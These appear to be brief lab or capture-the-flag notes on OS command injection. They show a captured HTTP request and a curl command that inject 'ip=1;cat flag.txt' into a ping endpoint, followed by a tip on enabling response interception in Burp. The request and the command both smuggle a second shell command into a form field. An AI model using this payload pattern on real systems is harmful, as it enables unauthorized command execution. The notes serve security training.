___

# OS Command Injection

```http
POST /ping HTTP/1.1
Host: 83.136.255.79:42835
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 17
Origin: http://83.136.255.79:42835
Connection: keep-alive
Referer: http://83.136.255.79:42835/
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
Priority: u=0, i

ip=1;cat flag.txt
```

```bash
curl -X POST http://83.136.255.79:42835/ping -d "ip=1;cat flag.txt"
```


## Intercepting Responses

In Burp, we can enable response interception by going to (`Proxy>Options`) and enabling `Intercept Response` under `Intercept Server Responses`

